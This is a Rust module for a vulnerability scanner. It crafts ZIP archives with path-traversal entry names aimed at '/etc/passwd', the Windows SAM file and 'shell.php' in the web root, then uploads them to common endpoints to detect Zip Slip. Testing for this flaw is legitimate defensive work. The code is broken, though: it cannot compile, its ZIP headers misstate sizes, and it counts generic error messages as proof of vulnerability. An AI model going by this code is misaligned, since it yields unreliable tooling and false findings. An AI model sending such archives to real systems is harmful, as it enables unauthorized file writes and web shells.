//! Zip Slip Vulnerability Detection
//! Detects Zip Slip vulnerability by crafting archives with path traversal filenames.
//! Tests for CVE-2018-1002200 and similar archive extraction flaws.

use crate::checks::Check;
use crate::findings::Finding;
use crate::http::{Request, Response, Method};
use std::collections::HashMap;

/// Maximum zip variants to test (bounded)
const MAX_ZIP_VARIANTS: usize = 15;

/// Path traversal patterns for Zip Slip
const TRAVERSAL_PATTERNS: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../../../tmp/test",
    "foo/../../../etc/passwd",
    "normal/../../../var/www/shell.php",
    "../shell.php",
    "..\\shell.asp",
];

/// Minimal ZIP file header (local file header signature)
const ZIP_LOCAL_HEADER: &[u8] = &[0x50, 0x4B, 0x03, 0x04];

/// Test marker for successful extraction
const EXTRACTION_MARKER: &str = "ZIPSLIP_TEST";

pub struct ZipSlipCheck {
    zip_variants: Vec<Vec<u8>>,
}

impl ZipSlipCheck {
    pub fn new() -> Self {
        let mut variants = Vec::with_capacity(MAX_ZIP_VARIANTS);
        
        // Generate malicious ZIP variants with path traversal
        for pattern in TRAVERSAL_PATTERNS.iter().take(MAX_ZIP_VARIANTS) {
            if let Some(zip_data) = self.create_malicious_zip(pattern) {
                variants.push(zip_data);
            }
        }
        
        Self { zip_variants: variants }
    }
    
    /// Create a minimal ZIP with path traversal filename
    fn create_malicious_zip(&self, traversal_path: &str) -> Option<Vec<u8>> {
        let mut zip = Vec::with_capacity(512);
        
        // Local file header
        zip.extend_from_slice(ZIP_LOCAL_HEADER); // Signature
        zip.extend_from_slice(&[0x14, 0x00]); // Version needed
        zip.extend_from_slice(&[0x00, 0x00]); // General purpose flags
        zip.extend_from_slice(&[0x00, 0x00]); // Compression method (stored)
        zip.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Mod time/date
        zip.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // CRC32 (simplified)
        zip.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Compressed size
        zip.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Uncompressed size
        
        let filename_bytes = traversal_path.as_bytes();
        let filename_len = filename_bytes.len() as u16;
        zip.extend_from_slice(&filename_len.to_le_bytes()); // Filename length
        zip.extend_from_slice(&[0x00, 0x00]); // Extra field length
        
        zip.extend_from_slice(filename_bytes); // Filename with traversal
        
        // Add file content (marker payload)
        let content = format!("{}\n", EXTRACTION_MARKER).into_bytes();
        zip.extend_from_slice(&content);
        
        // Note: This is a simplified ZIP structure for detection purposes
        // Real implementation would include proper CRC and central directory
        
        Some(zip)
    }
    
    /// Test upload endpoint with malicious ZIP
    fn test_zip_upload(&self, req: &Request, upload_path: &str) -> Option<Finding> {
        for (i, zip_data) in self.zip_variants.iter().enumerate() {
            let filename = format!("test{}.zip", i);
            
            let mut upload_req = req.clone();
            upload_req.set_method(Method::POST);
            upload_req.set_upload_file("file", &filename, zip_data);
            upload_req.set_url(upload_path);
            
            match upload_req.send_with_timeout(10000) {
                Ok(response) => {
                    if self.detect_zip_slip(&response) {
                        return Some(Finding::new(
                            "ZIP_SLIP_VULNERABILITY",
                            "Server extracts ZIP files without validating path traversal",
                            response.url(),
                            9,
                        )
                        .with_payload(&format!("ZIP with path: {}", TRAVERSAL_PATTERNS[i % TRAVERSAL_PATTERNS.len()]))
                        .with_evidence("Path traversal in archive extraction detected")
                        .with_remediation(
                            "Validate extracted file paths are within intended directory. \
                             Use canonical path resolution before extraction. \
                             Reject archives containing '..' in filenames."
                        ));
                    }
                }
                Err(_) => continue,
            }
        }
        None
    }
    
    /// Detect Zip Slip exploitation indicators
    fn detect_zip_slip(&self, response: &Response) -> bool {
        let body = response.body_slice();
        
        // Check for error messages indicating traversal attempt
        let indicators = [
            b"permission denied",
            b"no such file",
            b"invalid path",
            b"path traversal",
            b"outside",
            b"extracted to",
            b"/etc/",
            b"/var/",
            b"C:\\Windows",
        ];
        
        for indicator in indicators.iter() {
            if body.contains(indicator) {
                return true;
            }
        }
        
        // Check for success indicators
        if body.contains(b"extracted") || body.contains(b"unzipped") {
            return true;
        }
        
        false
    }
}

impl Check for ZipSlipCheck {
    fn name(&self) -> &'static str {
        "ZipSlip"
    }
    
    fn run(&self, request: &Request) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Common upload/extract endpoints
        let extract_paths = [
            "/upload",
            "/extract",
            "/unzip",
            "/api/upload",
            "/api/extract",
            "/file/upload",
            "/rest/import",
        ];
        
        for path in extract_paths.iter() {
            if let Some(finding) = self.test_zip_upload(request, path) {
                findings.push(finding);
                break;
            }
        }
        
        findings
    }
    
    fn metadata(&self) -> HashMap<&'static str, &'static str> {
        let mut meta = HashMap::new();
        meta.insert("type", "zip_slip");
        meta.insert("severity", "high");
        meta.insert("cve", "CVE-2018-1002200");
        meta.insert("cwe", "CWE-22");
        meta
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_zip_variant_count() {
        let check = ZipSlipCheck::new();
        assert!(check.zip_variants.len() <= MAX_ZIP_VARIANTS);
    }
    
    #[test]
    fn test_malicious_zip_creation() {
        let check = ZipSlipCheck::new();
        let zip = check.create_malicious_zip("../test.txt").unwrap();
        assert!(zip.starts_with(ZIP_LOCAL_HEADER));
        assert!(zip.contains(b"../test.txt"));
    }
}
